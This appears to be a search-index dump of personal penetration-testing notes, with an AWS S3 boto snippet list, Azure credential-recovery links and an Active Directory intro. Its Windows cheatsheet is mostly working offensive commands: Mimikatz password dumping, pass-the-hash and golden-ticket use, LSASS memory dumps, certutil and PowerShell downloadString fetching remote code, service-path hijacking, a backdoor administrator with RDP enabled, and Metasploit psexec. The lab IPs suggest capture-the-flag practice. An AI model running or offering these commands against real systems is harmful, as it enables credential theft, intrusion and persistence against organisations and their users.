Create a S3 bucket in a different region EU Hack : Create a folder in a S3 bucket Hack : Create a new object in S3 Hack : Delete a S3 bucket Hack : Delete a s3 object Hack : Delete all cors for the s3 bucket Hack : Delete all files in a folder Hack : Delete lifecycle to S3 bucket Hack : Delete tags of a S3 bucket Hack : Disable Logging for the S3 bucket Hack : Disable a buckets Versioning Hack : Disable a lifecycle to S3 bucket Hack : Download a S3 file or a S3 object Hack : Download a file using the method get_file Hack : Enable Logging for the S3 bucket Hack : Enable Versioning Hack : Find out the status of the Bucket Versioning Hack : Generate a URL for the S3 bucket with an expiration time 20 seconds Hack : Generate a URL for the S3 object with expiration of 5 min Hack : Get CORS for an S3 bucket Hack : Get CORS for an S3 bucket as xml Hack : Get a metadata value name name added to the S3 object Hack : Get all the S3 regions Hack : Get all the metadata added to the S3 object Hack : Get all the versions of the S3 Objects Hack : Get an expiry date of a key / object in S3 Hack : Get lifecycle to S3 bucket Hack : Get lifecycle to S3 bucket as xml Hack : Get status of the restore of an object from glacier Hack : Get the ACL of the S3 bucket Hack : Get the ACL of the object Hack : Get the ACL of the object as xml Hack : Get the Location of the s3 bucket Hack : Get the bucket Policy Hack : Get the canonical user id of the S3 bucket Hack : Get the content type of object . Note only works with get_key Hack : Get the contents of the object as a string Hack : Get the get_xml_acl of an S3 object Hack : Get the redirect for an S3 object Hack : Get the tags of a S3 bucket Hack : Get the website configuration for this s3 bucket Hack : Get the website configuration in xml for this s3 bucket Hack : Get the website_endpoint of a s3 bucket Hack : How to add an exception Hack : How to enable debugging for S3 Hack : List all the S3 buckets Hack : List all the grants for a given Bucket Hack : List all the objects Owner Hack : List all the objects in a S3 bucket Hack : List all the objects last modified timestamp in Zulu format Hack : List all the objects size in bytes Hack : List all the objects with in a bucket Hack : List all the objects with in a bucket and if the object is moved to Glacier Hack : List all the objects with in a bucket with a prefix Hack : List all the objects with the versions for a given Bucket Hack : List whether the object is encrypted while at rest on the server Hack : Logging status for the S3 bucket Hack : Make S3 bucket public readable Hack : Make a http connection to S3 instead of https Hack : Make an object public Hack : Move s3 objects to Glacier Hack : Move s3 objects to Glacier add a Expiration Hack : Restore an object from glacier Hack : Search for bucket in a different AWS Region Hack : Search for a bucket with bucket name which is case sensitive Hack : Search for a specific bucket Hack : Set a canned ACL for object , authenticated - read Hack : Set a canned ACL for object , canned_bucket_owner_full_control Hack : Set a canned ACL for object , canned_bucket_owner_read Hack : Set a canned ACL for object , public read Hack : Set a canned ACL for object , public read write Hack : Set a canned ACL , authenticated - read Hack : Set a canned ACL , private Hack : Set a canned ACL , public - read Hack : Set a canned ACL , public - read - write Hack : Set a private canned ACL for an object Hack : Set a redirect for an S3 object Hack : Set metadata for a new s3 object on creation Hack : Set set_request_payment for a bucket Hack : Set the bucket Policy Hack : Set the meta data for an object Hack : Set up CORS for an S3 bucket Hack : Upload a file to S3 bucket using method initiate_multipart_upload . Note should be 5 MB Hack : Upload a file to S3 bucket using method set_contents_from_filename Hack : Upload a file to s3 bucket using the method send_file","title":"Collections"},{"location":"cloud/azuer/","text":"References https://www.guardicore.com/2018/03/recovering-plaintext-passwords-azure/ https://blog.xpnsec.com/azuread-connect-for-redteam/ https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545#file-azuread_decrypt_msol-ps1","title":"Azuer"},{"location":"cloud/azuer/#references","text":"https://www.guardicore.com/2018/03/recovering-plaintext-passwords-azure/ https://blog.xpnsec.com/azuread-connect-for-redteam/ https://gist.github.com/xpn/0dc393e944d8733e3c63023968583545#file-azuread_decrypt_msol-ps1","title":"References"},{"location":"os/windows/0-cheatsheed/","text":"Cheatsheet Commands prevesc: https://guif.re/windowseop VMs: https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/ Versions Windows 1 . 0 1 . 04 Windows 2 . 0 2 . 11 Windows 3 . 0 3 Windows NT 3 . 1 3 . 10 . 528 Windows for Workgroups 3 . 11 3 . 11 Windows NT Workstation 3 . 5 3 . 5 . 807 Windows NT Workstation 3 . 51 3 . 51 . 1057 Windows 95 4 . 0 . 950 Windows NT Workstation 4 . 0 4 . 0 . 1381 Windows 98 4 . 1 . 1998 Windows 98 Second Edition 4 . 1 . 2222 Windows Me 4 . 90 . 3000 Windows 2000 Professional 5 . 0 . 2195 Windows XP 5 . 1 . 2600 Windows Vista 6 . 0 . 6000 Windows 7 6 . 1 . 7600 Windows 8 . 1 6 . 3 . 9600 Windows 10 10 . 0 . 10240 User accounts LocalSystem account is a predefined local account used by the service control manager. https://msdn.microsoft.com/en-us/library/windows/desktop/ms684190(v=vs.85).aspx Not recognized by the security subsystem, so you cannot specify its name in a call to the LookupAccountName function. Has extensive privileges on the local computer, and acts as the computer on the network. Its token includes the NT AUTHORITY \\ SYSTEM and BUILTIN \\ Administrators SIDs; these accounts have access to most system objects. The name of the account in all locales is . \\ LocalSystem . The name, LocalSystem or ComputerName \\ LocalSystem can also be used. This account does not have a password. If you specify the LocalSystem account in a call to the CreateService or ChangeServiceConfig function, any password information you provide is ignored. The service can open the registry key HKEY_LOCAL_MACHINE\\SECURITY. The service presents the computer's credentials to remote servers. If the service opens a command window and runs a batch file, the user could hit CTRL+C to terminate the batch file and gain access to a command window with LocalSystem permissions. A service that runs in the context of the LocalSystem account inherits the security context of the SCM. The user SID is created from the SECURITY_LOCAL_SYSTEM_RID value. Has: E_ASSIGNPRIMARYTOKEN_NAME (disabled) SE_AUDIT_NAME (enabled) SE_BACKUP_NAME (disabled) SE_CHANGE_NOTIFY_NAME (enabled) SE_CREATE_GLOBAL_NAME (enabled) SE_CREATE_PAGEFILE_NAME (enabled) SE_CREATE_PERMANENT_NAME (enabled) SE_CREATE_TOKEN_NAME (disabled) SE_DEBUG_NAME (enabled) SE_IMPERSONATE_NAME (enabled) SE_INC_BASE_PRIORITY_NAME (enabled) SE_INCREASE_QUOTA_NAME (disabled) SE_LOAD_DRIVER_NAME (disabled) SE_LOCK_MEMORY_NAME (enabled) SE_MANAGE_VOLUME_NAME (disabled) SE_PROF_SINGLE_PROCESS_NAME (enabled) SE_RESTORE_NAME (disabled) SE_SECURITY_NAME (disabled) SE_SHUTDOWN_NAME (disabled) SE_SYSTEM_ENVIRONMENT_NAME (disabled) SE_SYSTEMTIME_NAME (disabled) SE_TAKE_OWNERSHIP_NAME (disabled) SE_TCB_NAME (enabled) SE_UNDOCK_NAME (disabled) LocalService account is a predefined local account used by the service control manager. https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85).aspx Not recognized by the security subsystem, so you cannot specify its name in a call to the LookupAccountName function. Has minimum privileges on the local computer and presents anonymous credentials on the network. Can be specified in a call to the CreateService and ChangeServiceConfig functions. This account does not have a password, so any password information that you provide in this call is ignored. While the security subsystem localizes this account name, the SCM does not support localized names. Therefore, you will receive a localized name for this account from the LookupAccountSid function, but the name of the account must be NT AUTHORITY \\ LocalService when you call CreateService or ChangeServiceConfig , regardless of the locale, or unexpected results can occur. The LocalService account has its own subkey under the HKEY_USERS registry key. Therefore, the HKEY_CURRENT_USER registry key is associated with the LocalService account. Has: SE_ASSIGNPRIMARYTOKEN_NAME (disabled) SE_AUDIT_NAME (disabled) SE_CHANGE_NOTIFY_NAME (enabled) SE_CREATE_GLOBAL_NAME (enabled) SE_IMPERSONATE_NAME (enabled) SE_INCREASE_QUOTA_NAME (disabled) SE_SHUTDOWN_NAME (disabled) SE_UNDOCK_NAME (disabled) Any privileges assigned to users and authenticated users NetworkService account is a predefined local account used by the service control manager. https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85).aspx Not recognized by the security subsystem, so you cannot specify its name in a call to the LookupAccountName function. Has minimum privileges on the local computer and acts as the computer on the network. This account can be specified in a call to the CreateService and ChangeServiceConfig functions. This account does not have a password, so any password information that you provide in this call is ignored. While the security subsystem localizes this account name, the SCM does not support localized names. Therefore, you will receive a localized name for this account from the LookupAccountSid function, but the name of the account must be NT AUTHORITY \\ NetworkService when you call CreateService or ChangeServiceConfig , regardless of the locale, or unexpected results can occur. A service that runs in the context of the NetworkService account presents the computer's credentials to remote servers. By default, the remote token contains SIDs for the Everyone and Authenticated Users groups. The user SID is created from the SECURITY_NETWORK_SERVICE_RID value. Has its own subkey under the HKEY_USERS registry key. Therefore, the HKEY_CURRENT_USER registry key is associated with the NetworkService account. Has: SE_ASSIGNPRIMARYTOKEN_NAME (disabled) SE_AUDIT_NAME (disabled) SE_CHANGE_NOTIFY_NAME (enabled) SE_CREATE_GLOBAL_NAME (enabled) SE_IMPERSONATE_NAME (enabled) SE_INCREASE_QUOTA_NAME (disabled) SE_SHUTDOWN_NAME (disabled) SE_UNDOCK_NAME (disabled) Any privileges assigned to users and authenticated users Mimikatz privilege :: debug sekurlsa :: logonPasswords full sekurlsa :: pth / user : Administrator / domain : WOSHUB / ntlm :{ NTLM_hash } / run : cmd . exe misc :: skeleton ipconfig / all whoami / user lsadump :: lsa / inject / name : krbtgt kerbros :: golden / domain :[ Domain ] / sid :[ SID ] / rc4 :[ NTLM Hash ] / user :[ Username To Create ] / id : 500 / ptt pushd \\\\ WINSERVER01 \\ c $ cd WINDOWS \\ NTDS If WDigest is disabled: reg add HKLM \\ SYSTEM \\ CurrentControlSet \\ Control \\ SecurityProviders \\ WDigest / v UseLogonCredential / t REG_DWORD / d 1 Export memory dump and use it in Mimikatz: Get - Process lsass | Out - Minidump sekurlsa :: minidump lsass_592 . dmp Using VMWare / Hibernate file: http://woshub.com/how-to-get-plain-text-passwords-of-windows-users/ Mimikatz features: https://adsecurity.org/?page_id=1821 PsExec https://www.contextis.com/en/blog/lateral-movement-a-deep-look-into-psexec https://www.toshellandback.com/2017/02/11/psexec/ http://fuzzynop.blogspot.com/2012/09/pass-hash-without-metasploit.html Open password protected share net use \\\\ server \\ share / user : test testpassword start \\\\ server \\ share Convert string to little-endian iconv - to - code UTF - 16 LE Should be done before base64 encoding for -ExecuteCommand in powershell Recon IP, subnet, default gateway etc: ipconfig / all Current user name, info in current access token, SID, privs and group that current user belongs to: whoami / all Local groups on current machine: net localgroup Local administrators of current machine: net localgroup administrators Active tcp connections, ports, which the computer is listening, ethernet statistics, ip routing table: netstat - an Running processes with verbose mode: tasklist / V Startup programs: net start Windows services with binary paths: sc qc service OS, processor, memory, bios related info: systeminfo output . txt Scheduled jobs: schtasks / query / fo LIST / v Patches installed and figuring out if its missing important any patch: wmic qfe get Caption , Description , HotFixID , InstalledOn Domain Network Recon Mapping of IP address to its MAC address in the network: arp - a Domain: echo % USERDOMAIN % Domain controller name: echo % logonserver % List of domain users: net user / domain List of groups in the domain: net group / domain AD domain password policy: net accounts / domain Map AD trust relationships: nltest / domain_trusts Moving files Ref: http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html certutil - verifyctl - split - f \u200b http : // 10 . 10 . 14 . 8 / taskkill . exe mv * . bin taskkill . exe Extract ZIP Add - Type - assembly system.io.compression.filesystem ;[ io . compression . zipfile ]:: ExtractToDirectory ( C:\\backup.zip , C:\\Example\\ ) View File Systems gdr - PSProvider FileSystem Access shared volume net use y : \\\\ 10 . 10 . 10 . 57 \\ c $ / user : administrator 1234 test Invoke command with credentials $ user = .\\administrator ; $ psw = 1234test ; $ secpsw = ConvertTo - SecureString $ psw - AsPlainText - Force ; $ credential = New - Object System . Management . Automation . PSCredential $ user , $ secpsw invoke-command -computername localhost -credential $ credential -scriptblock { cd C : \\ Users \\ Administrator \\ Desktop \\ ; C : \\ Users \\ Administrator \\ Desktop \\ root . exe } Alternate Data Stream Listing: dir / R Find Streams: \u200b get - item - path * . * - stream * Reading: \u200b powershell Get - Content - Path hm.txt - Stream root.txt Reading: get - content backup . zip - stream pass Reading: streams . exe / accepteula - s from sysinternals MSI Installing MSI msiexec / quiet / qn / i malicious . msi / quiet = Suppress any messages to the user during installation / qn = No GUI / i = Regular ( vs . administrative ) installation Services Registry entries: HKLM \\ SYSTEM \\ CurrentControlSet \\ Services View service properties: sc qc Vulnerable Service / net start Restarting: sc stop Vulnerable Service / net stop name Start: sc start Vulnerable Service / net start name Service information: Get - Service \u200b \u200b Ubiquiti UniFi Video \u200b | fl * Restart PC: shutdown / r / t 0 Change binary path: sc config Vulnerable Service binpath = net user eviladmin P4ssw0rd @ / add Disable: sc config servicename start = disabled Enable: sc config servicename start = demand Auto: sc config servicename start = auto Keep alive When a service starts in Windows operating systems, it must communicate with the Service Control Manager . If it's not, Service Control Manager will terminates the process. Auto Save Password to PowerShell reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon 2 nul | findstr DefaultUserName DefaultDomainName DefaultPassword $ passwd = ConvertTo - SecureString Welcome1! - AsPlainText - Force ; $ creds = New - Object System . Management . Automation . PSCredential ( administrator $ passwd ) \u200b Start - Process - FilePath powershell - argumentlist IEX(New-Object Net.webClient).downloadString( http:// LAB IP /writeup ) - Credential $ creds Permissions whoami / priv View Permisions cacls C : \\ Users \\ Administrator \\ Desktop \\ root . txt Grant Permissions cacls C : \\ Users \\ Administrator \\ Desktop \\ root . txt / grant Alfred : F cacls c:\\users\\Administrator\\Desktop\\root.txt / E / P Alfred : F cacls Windows utility to view / edit file permissions / E to edit ACL / P to set permissions Alfred : F to give Alfred full control of the file SSH from Windows to Attacker (Kali) Manual From Windows: plink . exe - l root - pw - R 445 : 127 . 0 . 0 . 1 : 445 10 . 10 . 14 . 8 From Attacker: netstat - ano | grep 445 winexe - U Administrator // 127 . 0 . 0 . 1 cmd.exe Metasploit portfwd add - l 445 - p 445 - r 127 . 0 . 0 . 1 use exploit / windows / smb / psexec set SMBDOMAIN CHATTERBOX set SMBUSER Administrators set SMBPASS Welcome1 ! set RHOST 127 . 0 . 0 . 1 exploit Enumeration Tips Ref: https://scriptdotsh.com/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/ Check the policies related to Network Access Control. Whether it can be bypassed or not. Go for guest wifi. It could lead you to get inside the company network if it is not segregated. Check for the printers in the environment. Try to do printer exploitation. Printers are part of domain network too. Try default passwords. Check for misconfigurations in the systems as well as the network. At the Domain level, always look for \"Administrators\" group members instead of going just for \"Domain Admins\". Reason being Builtin Administrators group is the superior one. Even \"Domain Admins\" group is also the member of administrators groups. Look for User Rights Assignments in the GPOs. They get checked very rarely. The ones which are configured for Domain Controllers actually have domain rights. Most of the organizations use the same image for all of their deployments. Which means they use same local admin password. Always check if same local admin account is being used in whole domain. Identify Admin Restrictions. (Logon Hours, LogonWorkstations) Decoys can be detected using this. Use Responder to collect NTLM hashes. Check SYSVOL too. ShareEnum to look for file shares. Add user and enable RDP net user hacker hacker / add net localgroup / add Administrators hacker reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server / v fDenyTSConnections / t REG_DWORD / d 0 / f References: Windows file association","title":"Cheatsheet"},{"location":"os/windows/0-cheatsheed/#cheatsheet","text":"Commands prevesc: https://guif.re/windowseop VMs: https://developer.microsoft.com/en-us/microsoft-edge/tools/vms/","title":"Cheatsheet"},{"location":"os/windows/0-cheatsheed/#versions","text":"Windows 1 . 0 1 . 04 Windows 2 . 0 2 . 11 Windows 3 . 0 3 Windows NT 3 . 1 3 . 10 . 528 Windows for Workgroups 3 . 11 3 . 11 Windows NT Workstation 3 . 5 3 . 5 . 807 Windows NT Workstation 3 . 51 3 . 51 . 1057 Windows 95 4 . 0 . 950 Windows NT Workstation 4 . 0 4 . 0 . 1381 Windows 98 4 . 1 . 1998 Windows 98 Second Edition 4 . 1 . 2222 Windows Me 4 . 90 . 3000 Windows 2000 Professional 5 . 0 . 2195 Windows XP 5 . 1 . 2600 Windows Vista 6 . 0 . 6000 Windows 7 6 . 1 . 7600 Windows 8 . 1 6 . 3 . 9600 Windows 10 10 . 0 . 10240","title":"Versions"},{"location":"os/windows/0-cheatsheed/#user-accounts","text":"LocalSystem account is a predefined local account used by the service control manager. https://msdn.microsoft.com/en-us/library/windows/desktop/ms684190(v=vs.85).aspx Not recognized by the security subsystem, so you cannot specify its name in a call to the LookupAccountName function. Has extensive privileges on the local computer, and acts as the computer on the network. Its token includes the NT AUTHORITY \\ SYSTEM and BUILTIN \\ Administrators SIDs; these accounts have access to most system objects. The name of the account in all locales is . \\ LocalSystem . The name, LocalSystem or ComputerName \\ LocalSystem can also be used. This account does not have a password. If you specify the LocalSystem account in a call to the CreateService or ChangeServiceConfig function, any password information you provide is ignored. The service can open the registry key HKEY_LOCAL_MACHINE\\SECURITY. The service presents the computer's credentials to remote servers. If the service opens a command window and runs a batch file, the user could hit CTRL+C to terminate the batch file and gain access to a command window with LocalSystem permissions. A service that runs in the context of the LocalSystem account inherits the security context of the SCM. The user SID is created from the SECURITY_LOCAL_SYSTEM_RID value. Has: E_ASSIGNPRIMARYTOKEN_NAME (disabled) SE_AUDIT_NAME (enabled) SE_BACKUP_NAME (disabled) SE_CHANGE_NOTIFY_NAME (enabled) SE_CREATE_GLOBAL_NAME (enabled) SE_CREATE_PAGEFILE_NAME (enabled) SE_CREATE_PERMANENT_NAME (enabled) SE_CREATE_TOKEN_NAME (disabled) SE_DEBUG_NAME (enabled) SE_IMPERSONATE_NAME (enabled) SE_INC_BASE_PRIORITY_NAME (enabled) SE_INCREASE_QUOTA_NAME (disabled) SE_LOAD_DRIVER_NAME (disabled) SE_LOCK_MEMORY_NAME (enabled) SE_MANAGE_VOLUME_NAME (disabled) SE_PROF_SINGLE_PROCESS_NAME (enabled) SE_RESTORE_NAME (disabled) SE_SECURITY_NAME (disabled) SE_SHUTDOWN_NAME (disabled) SE_SYSTEM_ENVIRONMENT_NAME (disabled) SE_SYSTEMTIME_NAME (disabled) SE_TAKE_OWNERSHIP_NAME (disabled) SE_TCB_NAME (enabled) SE_UNDOCK_NAME (disabled) LocalService account is a predefined local account used by the service control manager. https://msdn.microsoft.com/en-us/library/windows/desktop/ms684188(v=vs.85).aspx Not recognized by the security subsystem, so you cannot specify its name in a call to the LookupAccountName function. Has minimum privileges on the local computer and presents anonymous credentials on the network. Can be specified in a call to the CreateService and ChangeServiceConfig functions. This account does not have a password, so any password information that you provide in this call is ignored. While the security subsystem localizes this account name, the SCM does not support localized names. Therefore, you will receive a localized name for this account from the LookupAccountSid function, but the name of the account must be NT AUTHORITY \\ LocalService when you call CreateService or ChangeServiceConfig , regardless of the locale, or unexpected results can occur. The LocalService account has its own subkey under the HKEY_USERS registry key. Therefore, the HKEY_CURRENT_USER registry key is associated with the LocalService account. Has: SE_ASSIGNPRIMARYTOKEN_NAME (disabled) SE_AUDIT_NAME (disabled) SE_CHANGE_NOTIFY_NAME (enabled) SE_CREATE_GLOBAL_NAME (enabled) SE_IMPERSONATE_NAME (enabled) SE_INCREASE_QUOTA_NAME (disabled) SE_SHUTDOWN_NAME (disabled) SE_UNDOCK_NAME (disabled) Any privileges assigned to users and authenticated users NetworkService account is a predefined local account used by the service control manager. https://msdn.microsoft.com/en-us/library/windows/desktop/ms684272(v=vs.85).aspx Not recognized by the security subsystem, so you cannot specify its name in a call to the LookupAccountName function. Has minimum privileges on the local computer and acts as the computer on the network. This account can be specified in a call to the CreateService and ChangeServiceConfig functions. This account does not have a password, so any password information that you provide in this call is ignored. While the security subsystem localizes this account name, the SCM does not support localized names. Therefore, you will receive a localized name for this account from the LookupAccountSid function, but the name of the account must be NT AUTHORITY \\ NetworkService when you call CreateService or ChangeServiceConfig , regardless of the locale, or unexpected results can occur. A service that runs in the context of the NetworkService account presents the computer's credentials to remote servers. By default, the remote token contains SIDs for the Everyone and Authenticated Users groups. The user SID is created from the SECURITY_NETWORK_SERVICE_RID value. Has its own subkey under the HKEY_USERS registry key. Therefore, the HKEY_CURRENT_USER registry key is associated with the NetworkService account. Has: SE_ASSIGNPRIMARYTOKEN_NAME (disabled) SE_AUDIT_NAME (disabled) SE_CHANGE_NOTIFY_NAME (enabled) SE_CREATE_GLOBAL_NAME (enabled) SE_IMPERSONATE_NAME (enabled) SE_INCREASE_QUOTA_NAME (disabled) SE_SHUTDOWN_NAME (disabled) SE_UNDOCK_NAME (disabled) Any privileges assigned to users and authenticated users","title":"User accounts"},{"location":"os/windows/0-cheatsheed/#mimikatz","text":"privilege :: debug sekurlsa :: logonPasswords full sekurlsa :: pth / user : Administrator / domain : WOSHUB / ntlm :{ NTLM_hash } / run : cmd . exe misc :: skeleton ipconfig / all whoami / user lsadump :: lsa / inject / name : krbtgt kerbros :: golden / domain :[ Domain ] / sid :[ SID ] / rc4 :[ NTLM Hash ] / user :[ Username To Create ] / id : 500 / ptt pushd \\\\ WINSERVER01 \\ c $ cd WINDOWS \\ NTDS If WDigest is disabled: reg add HKLM \\ SYSTEM \\ CurrentControlSet \\ Control \\ SecurityProviders \\ WDigest / v UseLogonCredential / t REG_DWORD / d 1 Export memory dump and use it in Mimikatz: Get - Process lsass | Out - Minidump sekurlsa :: minidump lsass_592 . dmp Using VMWare / Hibernate file: http://woshub.com/how-to-get-plain-text-passwords-of-windows-users/ Mimikatz features: https://adsecurity.org/?page_id=1821","title":"Mimikatz"},{"location":"os/windows/0-cheatsheed/#psexec","text":"https://www.contextis.com/en/blog/lateral-movement-a-deep-look-into-psexec https://www.toshellandback.com/2017/02/11/psexec/ http://fuzzynop.blogspot.com/2012/09/pass-hash-without-metasploit.html","title":"PsExec"},{"location":"os/windows/0-cheatsheed/#open-password-protected-share","text":"net use \\\\ server \\ share / user : test testpassword start \\\\ server \\ share","title":"Open password protected share"},{"location":"os/windows/0-cheatsheed/#convert-string-to-little-endian","text":"iconv - to - code UTF - 16 LE Should be done before base64 encoding for -ExecuteCommand in powershell","title":"Convert string to little-endian"},{"location":"os/windows/0-cheatsheed/#recon","text":"IP, subnet, default gateway etc: ipconfig / all Current user name, info in current access token, SID, privs and group that current user belongs to: whoami / all Local groups on current machine: net localgroup Local administrators of current machine: net localgroup administrators Active tcp connections, ports, which the computer is listening, ethernet statistics, ip routing table: netstat - an Running processes with verbose mode: tasklist / V Startup programs: net start Windows services with binary paths: sc qc service OS, processor, memory, bios related info: systeminfo output . txt Scheduled jobs: schtasks / query / fo LIST / v Patches installed and figuring out if its missing important any patch: wmic qfe get Caption , Description , HotFixID , InstalledOn","title":"Recon"},{"location":"os/windows/0-cheatsheed/#domain-network-recon","text":"Mapping of IP address to its MAC address in the network: arp - a Domain: echo % USERDOMAIN % Domain controller name: echo % logonserver % List of domain users: net user / domain List of groups in the domain: net group / domain AD domain password policy: net accounts / domain Map AD trust relationships: nltest / domain_trusts","title":"Domain Network Recon"},{"location":"os/windows/0-cheatsheed/#moving-files","text":"Ref: http://carnal0wnage.attackresearch.com/2017/08/certutil-for-delivery-of-files.html certutil - verifyctl - split - f \u200b http : // 10 . 10 . 14 . 8 / taskkill . exe mv * . bin taskkill . exe","title":"Moving files"},{"location":"os/windows/0-cheatsheed/#extract-zip","text":"Add - Type - assembly system.io.compression.filesystem ;[ io . compression . zipfile ]:: ExtractToDirectory ( C:\\backup.zip , C:\\Example\\ )","title":"Extract ZIP"},{"location":"os/windows/0-cheatsheed/#view-file-systems","text":"gdr - PSProvider FileSystem","title":"View File Systems"},{"location":"os/windows/0-cheatsheed/#access-shared-volume","text":"net use y : \\\\ 10 . 10 . 10 . 57 \\ c $ / user : administrator 1234 test","title":"Access shared volume"},{"location":"os/windows/0-cheatsheed/#invoke-command-with-credentials","text":"$ user = .\\administrator ; $ psw = 1234test ; $ secpsw = ConvertTo - SecureString $ psw - AsPlainText - Force ; $ credential = New - Object System . Management . Automation . PSCredential $ user , $ secpsw invoke-command -computername localhost -credential $ credential -scriptblock { cd C : \\ Users \\ Administrator \\ Desktop \\ ; C : \\ Users \\ Administrator \\ Desktop \\ root . exe }","title":"Invoke command with credentials"},{"location":"os/windows/0-cheatsheed/#alternate-data-stream","text":"Listing: dir / R Find Streams: \u200b get - item - path * . * - stream * Reading: \u200b powershell Get - Content - Path hm.txt - Stream root.txt Reading: get - content backup . zip - stream pass Reading: streams . exe / accepteula - s from sysinternals","title":"Alternate Data Stream"},{"location":"os/windows/0-cheatsheed/#msi","text":"","title":"MSI"},{"location":"os/windows/0-cheatsheed/#installing-msi","text":"msiexec / quiet / qn / i malicious . msi / quiet = Suppress any messages to the user during installation / qn = No GUI / i = Regular ( vs . administrative ) installation","title":"Installing MSI"},{"location":"os/windows/0-cheatsheed/#services","text":"Registry entries: HKLM \\ SYSTEM \\ CurrentControlSet \\ Services View service properties: sc qc Vulnerable Service / net start Restarting: sc stop Vulnerable Service / net stop name Start: sc start Vulnerable Service / net start name Service information: Get - Service \u200b \u200b Ubiquiti UniFi Video \u200b | fl * Restart PC: shutdown / r / t 0 Change binary path: sc config Vulnerable Service binpath = net user eviladmin P4ssw0rd @ / add Disable: sc config servicename start = disabled Enable: sc config servicename start = demand","title":"Services"},{"location":"os/windows/0-cheatsheed/#auto-sc-config-servicename-start-auto","text":"","title":"Auto: sc config servicename start= auto"},{"location":"os/windows/0-cheatsheed/#keep-alive","text":"When a service starts in Windows operating systems, it must communicate with the Service Control Manager . If it's not, Service Control Manager will terminates the process.","title":"Keep alive"},{"location":"os/windows/0-cheatsheed/#auto-save-password-to-powershell","text":"reg query HKLM\\SOFTWARE\\Microsoft\\Windows NT\\Currentversion\\Winlogon 2 nul | findstr DefaultUserName DefaultDomainName DefaultPassword $ passwd = ConvertTo - SecureString Welcome1! - AsPlainText - Force ; $ creds = New - Object System . Management . Automation . PSCredential ( administrator $ passwd ) \u200b Start - Process - FilePath powershell - argumentlist IEX(New-Object Net.webClient).downloadString( http:// LAB IP /writeup ) - Credential $ creds","title":"Auto Save Password to PowerShell"},{"location":"os/windows/0-cheatsheed/#permissions","text":"whoami / priv","title":"Permissions"},{"location":"os/windows/0-cheatsheed/#view-permisions","text":"cacls C : \\ Users \\ Administrator \\ Desktop \\ root . txt","title":"View Permisions"},{"location":"os/windows/0-cheatsheed/#grant-permissions","text":"cacls C : \\ Users \\ Administrator \\ Desktop \\ root . txt / grant Alfred : F cacls c:\\users\\Administrator\\Desktop\\root.txt / E / P Alfred : F cacls Windows utility to view / edit file permissions / E to edit ACL / P to set permissions Alfred : F to give Alfred full control of the file","title":"Grant Permissions"},{"location":"os/windows/0-cheatsheed/#ssh-from-windows-to-attacker-kali","text":"","title":"SSH from Windows to Attacker (Kali)"},{"location":"os/windows/0-cheatsheed/#manual","text":"From Windows: plink . exe - l root - pw - R 445 : 127 . 0 . 0 . 1 : 445 10 . 10 . 14 . 8 From Attacker: netstat - ano | grep 445 winexe - U Administrator // 127 . 0 . 0 . 1 cmd.exe","title":"Manual"},{"location":"os/windows/0-cheatsheed/#metasploit","text":"portfwd add - l 445 - p 445 - r 127 . 0 . 0 . 1 use exploit / windows / smb / psexec set SMBDOMAIN CHATTERBOX set SMBUSER Administrators set SMBPASS Welcome1 ! set RHOST 127 . 0 . 0 . 1 exploit","title":"Metasploit"},{"location":"os/windows/0-cheatsheed/#enumeration-tips","text":"Ref: https://scriptdotsh.com/index.php/2019/01/01/active-directory-penetration-dojo-ad-environment-enumeration-1/ Check the policies related to Network Access Control. Whether it can be bypassed or not. Go for guest wifi. It could lead you to get inside the company network if it is not segregated. Check for the printers in the environment. Try to do printer exploitation. Printers are part of domain network too. Try default passwords. Check for misconfigurations in the systems as well as the network. At the Domain level, always look for \"Administrators\" group members instead of going just for \"Domain Admins\". Reason being Builtin Administrators group is the superior one. Even \"Domain Admins\" group is also the member of administrators groups. Look for User Rights Assignments in the GPOs. They get checked very rarely. The ones which are configured for Domain Controllers actually have domain rights. Most of the organizations use the same image for all of their deployments. Which means they use same local admin password. Always check if same local admin account is being used in whole domain. Identify Admin Restrictions. (Logon Hours, LogonWorkstations) Decoys can be detected using this. Use Responder to collect NTLM hashes. Check SYSVOL too. ShareEnum to look for file shares.","title":"Enumeration Tips"},{"location":"os/windows/0-cheatsheed/#add-user-and-enable-rdp","text":"net user hacker hacker / add net localgroup / add Administrators hacker reg add HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server / v fDenyTSConnections / t REG_DWORD / d 0 / f","title":"Add user and enable RDP"},{"location":"os/windows/0-cheatsheed/#references","text":"Windows file association","title":"References:"},{"location":"os/windows/active-directory/","text":"Active Directory Introduction Active Directory enables centralized, secure management of an entire network, which might span a building, a city, or multiple locations throughout the world. https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc780036(v=ws.10 ) These antiquated AD designs only focused on the: - Directory information tree - Delegation model - Group Policy Objects (GPOs) structure and accounts management Securing privileged access - Active Directory administrative tier model: https://docs.microsoft.com/en-us/windows-server/identity/securing-privileged-access/securing-privileged-access-reference-material Components https://docs.microsoft.com/en-us/previous-versions/windows/it-pro/windows-server-2003/cc759186(v%3dws.10 ) Component Description Organizational Units Container object Used to arrange other objects Easier to locate and manage Can delegate the authority to manage Can be nested in other organizational units Domains Container object Collection of administratively defined objects that share a common directory database, security policies, and trust relationships with other domains Each domain is an administrative boundary for objects. A single domain can span multiple physical locations or sites Domain Trees Collections of domains that are grouped together in hierarchical structures When you add a domain to a tree, it becomes a child of the tree root domain The domain to which a child domain is attached is called the parent domain. A child domain might in turn have its own child domain. The name of a child domain is combined with the name of its parent domain to form its own unique Domain Name System (DNS) name such as Corp.nwtraders.msft. .:. a tree has a contiguous namespace. Forests Instance of Active Directory Each forest acts as a top-level container in that it houses all domain containers for that particular Active Directory instance A forest can contain one or more domain container objects, all of which share a common logical structure, global catalog, directory schema, and directory configuration, as well as automatic two-way transitive trust relationships. The first domain in the forest is called the forest root domain . The name of that domain refers to the forest, such as Nwtraders.msft. By default, information in Active Directory is shared only within the forest. .:. the forest is a security boundary for the information that is contained in that instance of Active Directory Site Objects Leaf and container objects Topmost object in the hierarchy of objects that are used to manage and implement Active 